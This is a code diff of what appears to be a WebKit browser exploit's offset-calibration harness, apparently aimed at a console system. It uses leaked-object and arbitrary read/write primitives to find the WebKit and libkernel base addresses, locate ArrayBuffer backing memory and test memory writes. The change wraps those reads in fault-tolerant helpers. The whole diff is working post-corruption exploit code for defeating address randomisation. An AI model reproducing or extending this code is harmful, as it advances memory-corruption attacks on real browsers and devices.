@@ -106,15 +106,45 @@ function alignedModuleBase(v) {
     return v.hi > 0 && (v.low & 0x3fff) === 0;
 }
 
+function plausibleUserPtr(v) {
+    if (!v || typeof v !== "object" || !("low" in v)) return false;
+    const hi = v.hi >>> 0;
+    const lo = v.low >>> 0;
+    if (hi === 0 || hi > 0xffff) return false;
+    if (lo === 0 && hi === 0) return false;
+    return true;
+}
+
+function safeRead8(p, addr) {
+    if (!plausibleUserPtr(addr)) return null;
+    try {
+        return p.read8(addr);
+    } catch (_) {
+        return null;
+    }
+}
+
+function safeRead4(p, addr) {
+    if (!plausibleUserPtr(addr)) return null;
+    try {
+        return p.read4(addr);
+    } catch (_) {
+        return null;
+    }
+}
+
 function nativeExpm1(p, mFunctionOff) {
     const fnCell = p.leakval(Math.expm1);
-    return p.read8(p.read8(fnCell.add32(0x18)).add32(mFunctionOff));
+    const fnBody = safeRead8(p, fnCell.add32(0x18));
+    if (!fnBody) return null;
+    return safeRead8(p, fnBody.add32(mFunctionOff));
 }
 
 function bufAddr(p, off, ab) {
     const cell = p.leakval(ab);
-    return p.read8(p.read8(cell.add32(off.wk_ArrayBuffer_m_impl))
-        .add32(off.wk_ArrayBuffer_m_contents_m_data));
+    const impl = safeRead8(p, cell.add32(off.wk_ArrayBuffer_m_impl));
+    if (!impl) return null;
+    return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
 }
 
 function findArrayBufferBacking(p, ab, expectLo) {
@@ -122,25 +152,25 @@ function findArrayBufferBacking(p, ab, expectLo) {
     const implOffs = [0x8, 0x10, 0x18];
     const seen = new Set();
     const tryPtr = (label, ptr) => {
+        if (!ptr) return null;
         const key = ptr.low + ":" + ptr.hi;
-        if (seen.has(key) || ptr.hi === 0) return null;
+        if (seen.has(key)) return null;
         seen.add(key);
-        try {
-            if (p.read4(ptr).low === expectLo) return { label, ptr };
-        } catch (_) { }
+        const val = safeRead4(p, ptr);
+        if (val === expectLo) return { label, ptr };
         return null;
     };
 
     for (let o = 0; o <= 0x40; o += 8) {
-        const hit = tryPtr("cell+0x" + o.toString(16), p.read8(cell.add32(o)));
+        const hit = tryPtr("cell+0x" + o.toString(16), safeRead8(p, cell.add32(o)));
         if (hit) return hit;
     }
     for (const implOff of implOffs) {
-        const impl = p.read8(cell.add32(implOff));
-        if (impl.hi === 0) continue;
+        const impl = safeRead8(p, cell.add32(implOff));
+        if (!impl) continue;
         for (let o = 0; o <= 0x40; o += 8) {
             const hit = tryPtr("impl@cell+0x" + implOff.toString(16) + "+0x"
-                + o.toString(16), p.read8(impl.add32(o)));
+                + o.toString(16), safeRead8(p, impl.add32(o)));
             if (hit) return hit;
         }
     }
@@ -148,40 +178,35 @@ function findArrayBufferBacking(p, ab, expectLo) {
 }
 
 function findWebkitBase(p, nativeFn) {
+    if (!plausibleUserPtr(nativeFn)) return null;
     for (let delta = 0; delta < 0x04000000; delta += 0x4000) {
         const base = nativeFn.sub32(delta);
         if (!alignedModuleBase(base)) continue;
-        try {
-            if (p.read4(base).low === 0x464c457f)
-                return { base, wk_expm1_builtin: delta };
-        } catch (_) { }
+        const magic = safeRead4(p, base);
+        if (magic === 0x464c457f)
+            return { base, wk_expm1_builtin: delta };
     }
     return null;
 }
 
 function findErrorImport(p, webkitBase, hintRva) {
+    if (!plausibleUserPtr(webkitBase)) return null;
     const hi = webkitBase.hi;
     const windows = hintRva
         ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
         : [[0x3800000, 0x3d00000], [0, 0x0200000]];
     for (const [start, end] of windows) {
         for (let rva = start; rva < end; rva += 8) {
-            let ptr;
-            try {
-                ptr = p.read8(webkitBase.add32(rva));
-            } catch (_) {
-                continue;
-            }
-            if (ptr.hi <= hi || ptr.hi > hi + 4) continue;
+            const ptr = safeRead8(p, webkitBase.add32(rva));
+            if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
             for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
                 const lk = ptr.sub32(kErr);
                 if (!alignedModuleBase(lk)) continue;
-                try {
-                    const w0 = p.read4(lk).low;
-                    const w1 = p.read4(lk.add32(4)).low;
-                    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
-                        return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
-                } catch (_) { }
+                const w0 = safeRead4(p, lk);
+                const w1 = safeRead4(p, lk.add32(4));
+                if (w0 == null || w1 == null) continue;
+                if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+                    return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
             }
         }
     }
@@ -192,6 +217,10 @@ function calibrateOffsets(p, off) {
     mark("CALIBRATE", "scanning live module layout");
     const mFunctionOff = off.wk_JSFunction_m_function || 0x28;
     const nativeFn = nativeExpm1(p, mFunctionOff);
+    if (!nativeFn) {
+        mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
+        return null;
+    }
     mark("CAL-NATIVEFN", String(nativeFn));
 
     const wk = findWebkitBase(p, nativeFn);
@@ -312,27 +341,40 @@ async function runOffsetTests() {
         mark("AB-BACKING", backing.label + " -> " + backing.ptr);
 
     const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
-    checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
-    const got = p.read4(dataPtr);
-    checkOffset("arraybuffer-read4",
-        got.low === 0xdeadbeef,
-        "got=0x" + got.toString(16) + " ptr=" + dataPtr);
-    if (got.low === 0xdeadbeef) {
-        p.write4(dataPtr, new int64(0x13371337, 0));
-        checkOffset("arraybuffer-write4",
-            view[0] === 0x13371337,
-            "view[0]=" + view[0].toString(16));
+    if (!dataPtr) {
+        checkOffset("arraybuffer-data-plausible", false, "no backing ptr found");
+    } else {
+        checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
+        const got = safeRead4(p, dataPtr);
+        checkOffset("arraybuffer-read4",
+            got === 0xdeadbeef,
+            "got=" + (got == null ? "null" : "0x" + got.toString(16)) + " ptr=" + dataPtr);
+        if (got === 0xdeadbeef) {
+            p.write4(dataPtr, new int64(0x13371337, 0));
+            checkOffset("arraybuffer-write4",
+                view[0] === 0x13371337,
+                "view[0]=" + view[0].toString(16));
+        }
     }
 
     if (off.wk_expm1_builtin) {
         const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
-        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-        const libkernelBase = errorFn.sub32(off.k__error);
-        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-            + " nativeFn=" + nativeFn);
-        checkOffset("module-bases-0x4000-aligned",
-            alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
+        if (!nativeFn) {
+            checkOffset("module-bases-0x4000-aligned", false, "nativeFn unreadable");
+        } else {
+            const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+            const errorFn = safeRead8(p, webkitBase.add32(off.wk___imp___error));
+            if (!errorFn) {
+                checkOffset("module-bases-0x4000-aligned", false,
+                    "webkit=" + webkitBase + " error import unreadable");
+            } else {
+                const libkernelBase = errorFn.sub32(off.k__error);
+                mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
+                    + " nativeFn=" + nativeFn);
+                checkOffset("module-bases-0x4000-aligned",
+                    alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
+            }
+        }
     }
 
     const summary = passCount + " pass, " + failCount + " fail";
